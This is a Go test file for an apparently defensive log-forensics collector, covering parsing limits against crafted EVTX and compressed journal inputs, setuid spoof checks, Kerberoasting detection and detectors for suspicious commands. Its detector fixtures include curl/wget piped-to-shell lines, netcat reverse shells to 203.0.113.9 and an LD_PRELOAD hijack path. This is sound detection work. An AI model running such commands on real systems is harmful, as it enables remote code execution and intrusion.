package collector

import (
	"encoding/binary"
	"runtime"
	"strings"
	"testing"
	"time"
)

// evtxTextBomb builds a one-chunk log whose single record renders a template
// whose one element names a string substitution refs times; the record
// supplies a string of chars characters.
func evtxTextBomb(refs, chars int) []byte {
	le := binary.LittleEndian
	const defAt = 40000 // after the record: a resident template
	body := []byte{0x0f, 0x01, 0x01, 0x00, 0x01, 0, 0, 0, 0, 0, 0}
	nameOff := defAt + 24 + len(body) + 4
	body = le.AppendUint32(body, uint32(nameOff))
	body = append(body, 0, 0, 0, 0, 0, 0, 1, 0, 'E', 0, 0, 0) // inline name "E"
	body = append(body, 0x02)
	for i := 0; i < refs; i++ {
		body = append(body, 0x0e, 0, 0, 0x01) // substitution 0, a string
	}
	body = append(body, 0x04, 0x00)
	sub := le.AppendUint32(nil, 1)
	sub = le.AppendUint16(sub, uint16(chars*2))
	sub = append(sub, 0x01, 0)
	for i := 0; i < chars; i++ {
		sub = append(sub, 'A', 0)
	}
	inst := []byte{0x0c, 1, 0, 0, 0, 0}
	inst = le.AppendUint32(inst, defAt)
	inst = append(inst, 0x00)

	chunk := make([]byte, evtxChunkLen)
	copy(chunk, evtxChunkMagic)
	le.PutUint64(chunk[evtxChunkFirstIDAt:], 1)
	le.PutUint32(chunk[defAt+20:], uint32(len(body)))
	copy(chunk[defAt+24:], body)
	copy(chunk[defAt+24+len(body):], sub)
	rec := evtxChunkHdrLen
	le.PutUint32(chunk[rec:], evtxRecordMagic)
	le.PutUint32(chunk[rec+4:], uint32(24+len(inst)+4))
	le.PutUint64(chunk[rec+8:], 1)
	copy(chunk[rec+24:], inst)
	le.PutUint32(chunk[evtxFreeOffsetAt:], uint32(rec+24+len(inst)+4))
	file := make([]byte, evtxHeaderLen, evtxHeaderLen+len(chunk))
	copy(file, evtxFileMagic)
	return append(file, chunk...)
}

func renderedText(e *bxmlElement) int {
	if e == nil {
		return 0
	}
	n := len(e.Text)
	for _, c := range e.Children {
		n += renderedText(c)
	}
	return n
}

// One element naming a 4,000-character string 4,000 times used to take
// about 40 seconds for a single record: the text was rebuilt on every append
// and nothing bounded it. Now it renders linearly, within a per-record text
// budget, and the record is reported as cut short.
func TestEvtxRepeatedSubstitutionIsBounded(t *testing.T) {
	start := time.Now()
	recs, warns, err := parseEvtx(evtxTextBomb(4000, 4000), 0)
	if took := time.Since(start); took > 5*time.Second {
		t.Fatalf("text bomb took %v", took)
	}
	if err != nil || len(recs) != 1 {
		t.Fatalf("parseEvtx: %d records, %v", len(recs), err)
	}
	if n := renderedText(recs[0].Root); n > bxmlRecordTextBudget {
		t.Fatalf("rendered %d bytes of text, over the %d budget", n, bxmlRecordTextBudget)
	}
	found := false
	for _, w := range warns {
		found = found || strings.Contains(w, "too much text")
	}
	if !found {
		t.Fatalf("expected a warning about the record, got %v", warns)
	}
	// An ordinary amount of repetition still renders in full.
	recs, warns, err = parseEvtx(evtxTextBomb(100, 100), 0)
	if err != nil || len(recs) != 1 || len(warns) != 0 || renderedText(recs[0].Root) != 100*100 {
		t.Fatalf("small record: %d records, %v, %v", len(recs), warns, err)
	}
}

// A journal field's compressed payload states its own decompressed size; a
// crafted one claiming 16 MiB used to cost a 16 MiB allocation before the
// decoder found the payload empty, about 2 ms a field.
func TestJournalDecompressorsDontTrustClaimedSize(t *testing.T) {
	lz4 := make([]byte, 9)
	binary.LittleEndian.PutUint64(lz4, 16<<20)
	zstd := []byte{0x28, 0xb5, 0x2f, 0xfd, 0xa0, 0, 0, 0, 1, 0, 0, 0}
	binary.LittleEndian.PutUint32(zstd[5:], 16<<20)

	var before, after runtime.MemStats
	runtime.ReadMemStats(&before)
	for i := 0; i < 50; i++ {
		if _, err := journalLZ4(lz4, 16<<20); err == nil {
			t.Fatal("lz4: a truncated payload decoded")
		}
		if _, err := zstdDecompress(zstd, 16<<20); err == nil {
			t.Fatal("zstd: a truncated frame decoded")
		}
	}
	runtime.ReadMemStats(&after)
	if grew := after.TotalAlloc - before.TotalAlloc; grew > 8<<20 {
		t.Fatalf("100 empty payloads allocated %d bytes", grew)
	}
}

// su, and passwd, chage or gpasswd run by an ordinary user, are setuid root
// and log before taking root's uid, so journald records the user's real uid.
// They used to be reported as forged log lines, and the su events dropped.
func TestJournalSetuidToolsAreNotSpoofs(t *testing.T) {
	for _, c := range []struct {
		src  string
		l    jlog
		want bool
	}{
		{"su", jlog{Ident: "su", Comm: "su", UID: "1000", Exe: "/usr/bin/su", Transport: "syslog"}, true},
		{"su", jlog{Ident: "su", Comm: "su", UID: "1000", Transport: "syslog"}, true},
		{"sudo", jlog{Ident: "sudo", Comm: "sudo", UID: "1000", Exe: "/usr/bin/sudo"}, true},
		{"account", jlog{Ident: "passwd", Comm: "passwd", UID: "1000", Exe: "/usr/bin/passwd"}, true},
		{"su", jlog{Ident: "su", Comm: "logger", UID: "1000", Exe: "/usr/bin/logger"}, false},
		{"su", jlog{Ident: "su", Comm: "su", UID: "1000", Exe: "/tmp/su"}, false},
		{"su", jlog{Ident: "su", UID: "1000"}, false},
		{"sshd", jlog{Ident: "sshd", Comm: "sshd", UID: "1000", Exe: "/usr/sbin/sshd"}, false},
		{"cron", jlog{Ident: "cron", Comm: "cron", UID: "1000"}, false},
		{"account", jlog{Ident: "useradd", Comm: "useradd", UID: "1000"}, false},
		{"su", jlog{Ident: "su", Comm: "su", UID: "0"}, true},
	} {
		if got := journalSourceTrusted(c.src, c.l); got != c.want {
			t.Errorf("journalSourceTrusted(%s, %+v) = %v, want %v", c.src, c.l, got, c.want)
		}
	}

	res := NewResult("journald")
	tr := &journalTriage{res: res, sources: map[string]*sshSource{}, byKind: map[string]int{}}
	tr.add(jlog{Ident: "su", Comm: "su", UID: "1000", Exe: "/usr/bin/su", Transport: "syslog",
		Message: "FAILED SU (to root) alice on pts/0"})
	tr.finish()
	by := recordsBy(res.Finish())
	if len(by["su"]) != 1 || len(by["spoofed"]) != 0 {
		t.Fatalf("a real su line must be parsed, not reported as forged: %+v", by)
	}
}

// systemd drops comment lines wherever they are, even inside a continuation,
// and a comment ending in a backslash continues nothing. Joining such a
// comment with the next line used to hide that line's ExecStart.
func TestUnitCommentsAndContinuations(t *testing.T) {
	cases := map[string][]string{
		"[Service]\n# was: \\\nExecStart=/tmp/.x/run\n":                     {"ExecStart=/tmp/.x/run"},
		"[Service]\n; old \\\nExecStop=/dev/shm/x\n":                        {"ExecStop=/dev/shm/x"},
		"[Service]\nExecStart=/bin/sh -c \\\n# note\n  'curl x | sh'\n":     {"ExecStart=/bin/sh -c    'curl x | sh'"},
		"[Service]\nExecStart=/bin/echo a\\\\\\\\\nExecStop=/tmp/y\n":       {"ExecStart=/bin/echo a\\\\\\\\", "ExecStop=/tmp/y"},
		"[Service]\r\nExecStart=/opt/a \\\r\n  --flag\r\nExecReload=/b\r\n": {"ExecStart=/opt/a    --flag", "ExecReload=/b"},
	}
	for unit, want := range cases {
		var got []string
		for _, e := range parseUnitExecs([]byte(unit)) {
			got = append(got, e.Key+"="+e.Command)
		}
		if strings.Join(got, "|") != strings.Join(want, "|") {
			t.Errorf("%q:\n got %q\nwant %q", unit, got, want)
		}
	}
}

func TestScriptArgument(t *testing.T) {
	for cmd, want := range map[string]string{
		"/bin/sh /tmp/.x/run.sh":                           "/tmp/.x/run.sh",
		"bash -x /dev/shm/a":                               "/dev/shm/a",
		"sudo -u bob /usr/bin/python3 -u /tmp/a.py --flag": "/tmp/a.py",
		"python3 -W ignore /tmp/b.py":                      "/tmp/b.py",
		"bash -o pipefail /var/tmp/c.sh":                   "/var/tmp/c.sh",
		"FOO=1 nohup perl /tmp/x.pl":                       "/tmp/x.pl",
		"node --require /opt/a.js /tmp/srv.js":             "/tmp/srv.js",
		"sh -c '/tmp/x'":                                   "",
		"bash -lc 'curl x | sh'":                           "",
		"python3 -m http.server":                           "",
		"python3 -c 'print(1)'":                            "",
		"perl -e 'print 1' /tmp/x":                         "",
		"bash -s < /tmp/x":                                 "",
		"/tmp/.x/run --opt":                                "",
		"/usr/bin/curl -o /tmp/x http://h/":                "",
	} {
		if got := scriptArgument(cmd); got != want {
			t.Errorf("scriptArgument(%q) = %q, want %q", cmd, got, want)
		}
	}
}

// An MCP server or an agent hook started as "bash /tmp/x.sh" runs code from
// /tmp just as "/tmp/x" does.
func TestAIConfigsGradeInterpreterScripts(t *testing.T) {
	s := mcpServer{Client: "Claude Code", Config: "/home/a/.claude.json", Name: "x", Command: "bash", Args: []string{"/tmp/.cache/x.sh"}}
	if !hasRule(judgeMCPServer(s), "ai.mcp_server_unusual_path") {
		t.Errorf("MCP server running a /tmp script: %+v", judgeMCPServer(s))
	}
	h := agentHook{Client: "Claude Code", Event: "PreToolUse", Config: "/home/a/.claude/settings.json", Command: "sh /dev/shm/h.sh"}
	if !hasRule(judgeAgentHook(h), "ai.agent_hook_unusual_path") {
		t.Errorf("hook running a /dev/shm script: %+v", judgeAgentHook(h))
	}
	ok := mcpServer{Client: "Claude Code", Config: "/home/a/.claude.json", Name: "y", Command: "node", Args: []string{"/usr/lib/node_modules/srv/index.js"}}
	if hasRule(judgeMCPServer(ok), "ai.mcp_server_unusual_path") {
		t.Errorf("an installed server flagged: %+v", judgeMCPServer(ok))
	}
}

// AES tickets are what every client gets all day. They used to share the
// tracker's bounds with RC4 tickets, so on a big domain they could fill the
// client table and a later RC4 roast from a new account went uncounted.
func TestKerberoastAESVolumeDoesNotCrowdOutRC4(t *testing.T) {
	base := time.Date(2026, 11, 1, 3, 0, 0, 0, time.UTC)
	tgs := func(at time.Duration, account, service, etype string) winEvent {
		ev := dcEvent(4769, "TargetUserName", account, "ServiceName", service, "IpAddress", "10.0.0.5",
			"Status", "0x0", "TicketEncryptionType", etype)
		ev.TimeCreated = base.Add(at)
		return ev
	}
	tr := newKerberoastTracker()
	for i := 0; i < kerberoastMaxClients; i++ {
		tr.observe(tgs(time.Duration(i)*time.Millisecond, "user"+itoa(i)+"@CORP", "svc_web", "0x12"))
	}
	if tr.dropped == 0 || len(tr.clients) > kerberoastMaxClients/2 {
		t.Fatalf("AES clients: %d tracked, %d dropped", len(tr.clients), tr.dropped)
	}
	for i := 0; i < 6; i++ {
		tr.observe(tgs(time.Duration(i)*time.Second, "mallory@CORP", "svc_"+itoa(i), "0x17"))
	}
	found := false
	for _, r := range tr.flush() {
		found = found || r.Fields["account"] == "mallory@CORP" && r.Fields["encryption"] == "RC4"
	}
	if !found {
		t.Fatal("an RC4 roast after a flood of AES tickets went unreported")
	}
}

func TestCommandLineEvasions(t *testing.T) {
	for cmd, want := range map[string]bool{
		"echo \\`; bash -c \"$(curl -s http://203.0.113.9/a)\"": true,
		"echo `date`; bash -c `curl -s http://203.0.113.9/a`":   true,
		"echo `date` `hostname`":                                false,
	} {
		if got := runsDownloadedSubstitution(cmd); got != want {
			t.Errorf("runsDownloadedSubstitution(%q) = %v, want %v", cmd, got, want)
		}
	}
	if !pipesToShell("curl -s http://203.0.113.9/a | sudo -u root bash") || !pipesToShell("wget -qO- x | nice -n 5 sh") {
		t.Error("a wrapper's option value hid the shell a download is piped into")
	}
	for cmd, want := range map[string]bool{
		"nc -Ce /bin/sh 203.0.113.9 4444":  true,
		"ncat -4e /bin/sh 203.0.113.9 443": true,
		"nc -nlvke /bin/sh -p 4444":        true,
		"nc -lvp4444":                      false,
		"nc -w5 203.0.113.9 80":            false,
		"nc -p4444e 203.0.113.9 80":        false,
	} {
		if got := netcatExec(cmd); got != want {
			t.Errorf("netcatExec(%q) = %v, want %v", cmd, got, want)
		}
	}
	f, ok := judgeMCPCodeEnv("server x", "LD_PRELOAD", "/usr/lib/libfoo.so /tmp/.l/x.so")
	if !ok || f.Confidence != 70 || !strings.Contains(f.Detail, "from") {
		t.Errorf("LD_PRELOAD's space-separated list: %+v", f)
	}
}
